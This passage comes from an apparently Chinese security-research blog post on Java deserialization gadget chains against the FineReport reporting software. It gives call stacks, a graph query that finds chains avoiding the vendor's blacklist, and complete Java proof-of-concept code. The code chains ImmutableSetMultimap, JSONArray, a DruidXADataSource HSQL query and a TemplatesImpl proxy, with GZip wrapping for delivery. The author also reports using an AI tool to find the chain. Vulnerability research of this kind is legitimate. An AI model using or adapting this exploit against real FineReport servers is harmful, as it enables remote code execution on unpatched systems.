class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>我挑选了10.0.19，11.0.28，11.5.5，11.5.8进行对比，对比结果在：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/blacklist" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/blacklist<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="hibernate链"><a href="#hibernate链" class="headerlink" title="hibernate链"></a>hibernate链</h4><p><a class="link"   target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/11/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90" >https://blog.potatowo.top/2024/11/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
+<p>HashMap + TypedValue + TemplatesImpl</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773799484058-12957b00-c3c4-43b7-a09b-f4ede23dbe04.png"  alt="img"></p>
+<p>hiberate依赖中的TypedValue#hashCode能够调用getter方法，可以接TemplatesImpl#getOutputProperties</p>
+<p>调用栈（非帆软包名）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TypedValue.hashCode()</span><br><span class="line">ValueHolder.DefferedInitializer.initialize()</span><br><span class="line">org.hibernate.type.ComponentType#getHashCode(java.lang.Object)</span><br><span class="line">org.hibernate.type.ComponentType#getPropertyValue(java.lang.Object, int)</span><br><span class="line">org.hibernate.tuple.component.PojoComponentTuplizer.getPropertyValue-super-&gt;org.hibernate.tuple.component.AbstractComponentTuplizer#getPropertyValue</span><br><span class="line">org.hibernate.property.access.spi.GetterMethodImpl#get</span><br><span class="line">method.invoke()</span><br></pre></td></tr></table></figure>
+
+<p>这个是最早被禁的，目前基本用不了</p>
+<h4 id="TreeBag链"><a href="#TreeBag链" class="headerlink" title="TreeBag链"></a>TreeBag链</h4><p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2806" >https://forum.butian.net/share/2806<i class="fas fa-external-link-alt"></i></a></p>
+<p>TreeBag + ClassComparator + VersionComparator + POJONode</p>
+<p>TreeBag位于cc或cc4依赖中，帆软中存在：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773797898631-51200350-b183-47d6-8b17-7d35e869024a.png"  alt="img"></p>
+<p>TreeBag#readObject能触发到compare。</p>
+<p>com.fr.base.ClassComparator#compare能实例化一个Comparator，并调用其compare：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773799969873-a167ab34-f446-49f3-ba4f-543ad798cef0.png"  alt="img"></p>
+<p>org.freehep.util.VersionComparator#compare能够调用toString</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773799989330-50f0f36c-8dd8-479c-8925-15f550f812fb.png"  alt="img"></p>
+<p>com.fr.third.fasterxml.jackson.databind.node.POJONode#toString能调用getter方法。</p>
+<p>最后走java.security.SignedObject#getObject触发二次反序列化</p>
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.bag.TreeBag#readObject</span><br><span class="line">    java.util.TreeMap#put</span><br><span class="line">        java.util.TreeMap#compare</span><br><span class="line">            com.fr.base.ClassComparator#compare</span><br><span class="line">                org.freehep.util.VersionComparator#compare</span><br><span class="line">                    com.fr.third.fasterxml.jackson.databind.node.POJONode#toString</span><br><span class="line">                        java.security.SignedObject#getObject</span><br></pre></td></tr></table></figure>
+
+<p>这个在V10最后一个版本已经修复-2024.3.19-10.0.19；V11-2024.7.17-11.0.28已经修复（非最早修复版本）</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773801172561-8bfc567c-ba29-47bb-951e-bc8f61e88d9a.png"  alt="img"></p>
+<h4 id="TextAndMnemonicHashMap链"><a href="#TextAndMnemonicHashMap链" class="headerlink" title="TextAndMnemonicHashMap链"></a>TextAndMnemonicHashMap链</h4><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14869" >https://xz.aliyun.com/news/14869<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LiangYueSec/article/details/142096830" >https://blog.csdn.net/LiangYueSec/article/details/142096830<i class="fas fa-external-link-alt"></i></a></p>
+<p>HashMap + HashTable + UIDefaults$TextAndMnemonicHashMap + JSONArray + DruidXADataSource + HSQL + 二次反序列化&#x2F;JNDI</p>
+<p>主要讲一下JSONArray。</p>
+<p>com.fr.json.JSONArray</p>
+<p>这里的JSONArray，跟fastjson的可不是同一个，不过其toString方法，仍然能触发getter调用。</p>
+<p>跟进其toString方法。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773735501417-7f622a5b-ec4a-4d0c-9004-cab5d20ab640.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773735508634-6503943d-cf07-460f-9579-dcb145bc311c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773735523705-1a2cc25b-c202-4573-9dfc-5c7e1256c729.png"  alt="img"></p>
+<p>如果学习过jackson POJO那条链子，对这个writeValueAsString应该有印象，这个就是能触发getter方法，下面是POJO链中的writeValueAsString位置：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773796872100-2544f630-c8f4-4a00-a2f2-b5e128d5173f.png"  alt="img"></p>
+<p>不过这里略有不同，不能直接传入Object作为构造函数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773797360698-685cc989-f809-48ec-9866-981666cf7bd5.png"  alt="img"></p>
+<p>用ArrayList包一层即可：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773797654373-6eef2d90-b160-4ee1-b18b-4008e3b366b2.png"  alt="img"></p>
+<p>这里触发的getter方法要换一个，因为之前的SignedObject已经ban了。</p>
+<p>com.fr.third.alibaba.druid.pool.xa.DruidXADataSource#getXAConnection()能够触发JDBC连接，从而转化成JDBC利用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773802118210-892fbdc6-9e86-461e-bddf-06f259ac90cd.png"  alt="img"></p>
+<p>帆软有HSQL的驱动，而HSQL在JDBC连接时，可以调用任意public static方法，从而进行二次反序列化或JNDI。</p>
+<p>关于HSQL的利用，可以看浅蓝师傅和其他师傅的文章：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://b1ue.cn/archives/458.html" >https://b1ue.cn/archives/458.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9675" >https://xz.aliyun.com/news/9675<i class="fas fa-external-link-alt"></i></a></p>
+<p>DruidXADataSource的构造：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DruidDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">ds.setDriverClassName(<span class="string">&quot;com.fr.third.org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line">ds.setUrl(<span class="string">&quot;jdbc:hsqldb:mem:test&quot;</span>);</span><br><span class="line">ds.setUsername(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">ds.setPassword(<span class="string">&quot;&quot;</span>);</span><br><span class="line">ds.setInitialSize(<span class="number">1</span>);</span><br><span class="line">ds.setValidationQuery(<span class="string">&quot;CALL \&quot;org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize\&quot;(X&#x27;&quot;</span> +serData+ <span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line">ds.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">ds.setStatLogger(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 无法序列化的就设置成 null</span></span><br><span class="line">ReflectTools.setFieldValue(ds,<span class="string">&quot;transactionHistogram&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ReflectTools.setFieldValue(ds,<span class="string">&quot;initedLatch&quot;</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>V10全没修；V11-2024.7.17-11.0.28已修复（非最早修复版本）</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773801200848-c840c1c1-9ef3-46bc-8e03-4515d82f790e.png"  alt="img"></p>
+<h4 id="ImmutableSetMultimap链"><a href="#ImmutableSetMultimap链" class="headerlink" title="ImmutableSetMultimap链"></a>ImmutableSetMultimap链</h4><p>ImmutableSetMultimap + UsingToStringOrdering + JSONArray</p>
+<p>对比11.0.28和11.5.5的黑名单：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773801250287-c1b9e8d2-640c-41ea-b491-b8f9e38b655a.png"  alt="img"></p>
+<p>这里看一下com.fr.third.guava.collect.ImmutableSetMultimap：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773815685965-5995d47f-05bc-43ba-a824-e7ce5a7f1cee.png"  alt="img"></p>
+<p>这里一开始会反序列化一个comparator，之前的反序列化链中有通过compare触发toString的，所以这里可以再去找找，有没有不在黑名单中的compare方法。这里使用tabby对fine-cbb-11.0.jar进行分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME0:&quot;com.fr.third.guava.collect.ImmutableSetMultimap#readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME:&quot;compare&quot;&#125;)-[r:CALL]-&gt;(callee:Method&#123;NAME0:&quot;java.lang.Object#toString&quot;&#125;)</span><br><span class="line">call apoc.algo.allSimplePaths(source, sink, &quot;CALL&gt;|ALIAS&gt;&quot;, 10) yield path </span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">           n.CLASSNAME in [&quot;所有黑名单类&quot;])</span><br><span class="line">return path,r,callee limit 1</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773815366867-c827960b-a498-4c20-8608-a14ebc32d3f0.png"  alt="img"></p>
+<p>最后找到了com.fr.third.guava.collect.UsingToStringOrdering#compare：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773815386840-745ce374-f043-4e77-92f1-7a75f6c0ac7e.png"  alt="img"></p>
+<p>不过中间部分的链子有点问题，分析了一下不太能利用。</p>
+<p>但是现在已经指定链子的开头和结尾了，这里结合jar-analyzer-mcp，让AI进行分析：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/jar-analyzer/jar-analyzer" >https://github.com/jar-analyzer/jar-analyzer<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773816176999-e1b1d8e3-45df-476d-ab07-2e6e86b167a1.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773816196237-45fdef70-c17e-4cec-b09e-21020b1dc317.png"  alt="img"></p>
+<p>最终也是顺利给出了利用链，只花费了几分钟，不得不说jar-analyzer-mcp非常好用。</p>
+<p>根据AI的回答，写一下前半段POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fr.third.guava.collect.ImmutableSetMultimap;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.guava.collect.Ordering;</span><br><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"><span class="keyword">import</span> tools.UnsafeTools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">channel2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        getPayload();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ImmutableSetMultimap&lt;String, Object&gt; multimap = ImmutableSetMultimap.&lt;String, Object&gt;builder()</span><br><span class="line">                .put(<span class="string">&quot;key&quot;</span>, <span class="keyword">new</span> <span class="title class_">ToStringClass</span>())</span><br><span class="line">                .put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value2&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        Ordering&lt;Object&gt; comparator = Ordering.usingToString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ImmutableSortedSet 没法获取对象，找了子类</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.fr.third.guava.collect.RegularImmutableSortedSet&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">sortedSet</span> <span class="operator">=</span> UnsafeTools.getObjectByUnsafe(aClass);</span><br><span class="line">        ReflectTools.setFieldValue(sortedSet, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">        ReflectTools.setFieldValue(multimap, <span class="string">&quot;emptySet&quot;</span>, sortedSet);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = ReflectTools.ser2bytes(multimap);</span><br><span class="line">        ReflectTools.deser(bytes, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>能够成功触发toString：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773819045345-c935c9ec-c50b-427b-81bf-2c3f9c5777aa.png"  alt="img"></p>
+<p>手动分析一下。</p>
+<p>回到readObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773815711751-961eae33-3ab7-48a1-8f3e-fe430b9ef0a1.png"  alt="img"></p>
+<p>看一下valuesBuilder：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773815761092-b07b467b-46f4-4a9e-8f30-b5f44db10b42.png"  alt="img"></p>
+<p>这里显然返回ImmutableSortedSet.Builder。</p>
+<p>所以应该跟进到com.fr.third.guava.collect.ImmutableSortedSet.Builder#build：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773815824135-e844a909-cab1-45b4-8c5d-96b1a3eeb629.png"  alt="img"></p>
+<p>跟进sortAndDedup：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773818277680-42db34e2-81e1-4473-8dc2-fe1576da8e86.png"  alt="img"></p>
+<p>这里发现和上面AI给的链子不太一样，会直接进入Arrays.sort触发，跟进sort：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773819144432-ec1541f8-8d49-47c2-a771-84f21df45c10.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773818444274-b3a3440a-f1fe-4104-b883-774c7ce3d81d.png"  alt="img"></p>
+<p>这里hi-lo&#x3D;2，与ImmutableSetMultimap put的键值对数量有关，需要给同一个键put两个及以上的值才行。</p>
+<p>跟进countRunAndMakeAscending：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773818472379-0cdba1b8-01ad-450b-bb9f-8b26b00b0847.png"  alt="img"></p>
+<p>最终在这里触发compare。</p>
+<p>后面接DruidXADataSource.getXAConnection触发JDBC。</p>
+<p>二次反序列化的方法选择org.terracotta.modules.ehcache.collections.SerializationHelper#deserialize</p>
+<p>最终poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.guava.collect.ImmutableSetMultimap;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.guava.collect.Ordering;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"><span class="keyword">import</span> tools.StringTools;</span><br><span class="line"><span class="keyword">import</span> tools.TemplatesGen;</span><br><span class="line"><span class="keyword">import</span> tools.UnsafeTools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">channel2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        getPayload();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serData</span> <span class="operator">=</span> getSerData();</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        ds.setDriverClassName(<span class="string">&quot;com.fr.third.org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line">        ds.setUrl(<span class="string">&quot;jdbc:hsqldb:mem:test&quot;</span>);</span><br><span class="line">        ds.setUsername(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        ds.setPassword(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        ds.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        ds.setValidationQuery(<span class="string">&quot;CALL \&quot;org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize\&quot;(X&#x27;&quot;</span> +serData+ <span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line">        ds.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        ds.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        ReflectTools.setFieldValue(ds,<span class="string">&quot;transactionHistogram&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        ReflectTools.setFieldValue(ds,<span class="string">&quot;initedLatch&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(ds);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(list);</span><br><span class="line"></span><br><span class="line">        ImmutableSetMultimap&lt;String, Object&gt; multimap = ImmutableSetMultimap.&lt;String, Object&gt;builder()</span><br><span class="line">                .put(<span class="string">&quot;key&quot;</span>, jsonArray)</span><br><span class="line">                .put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value2&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        Ordering&lt;Object&gt; comparator = Ordering.usingToString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ImmutableSortedSet 没法获取对象，找了子类</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.fr.third.guava.collect.RegularImmutableSortedSet&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">sortedSet</span> <span class="operator">=</span> UnsafeTools.getObjectByUnsafe(aClass);</span><br><span class="line">        ReflectTools.setFieldValue(sortedSet, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line">        ReflectTools.setFieldValue(multimap, <span class="string">&quot;emptySet&quot;</span>, sortedSet);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = ReflectTools.ser2bytes(multimap);</span><br><span class="line">        ReflectTools.deser(bytes, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerData</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesGen.getTemplates1(<span class="literal">null</span>, <span class="string">&quot;D:/1tmp/classes/CalcAbs.class&quot;</span>);</span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.fr.third.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        list.add(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(list);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        ReflectTools.setFieldValue(bad, <span class="string">&quot;val&quot;</span>,  jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = ReflectTools.ser2bytes(bad);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> StringTools.bytesToHexString(bytes);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果要打帆软，外面还得包一层GZip：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">GZipSerializerWrapper.wrap(JDKSerializer.getInstance()).serialize((Serializable) multimap, baos);</span><br><span class="line"><span class="type">byte</span>[] byteArray = baos.toByteArray();</span><br></pre></td></tr></table></figure>
+
+<p>用到的Tools类在我的仓库：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/tools" >https://github.com/1diot9/MyJavaSecStudy/tree/main/tools<i class="fas fa-external-link-alt"></i></a></p>
+<p>调用栈：</p>
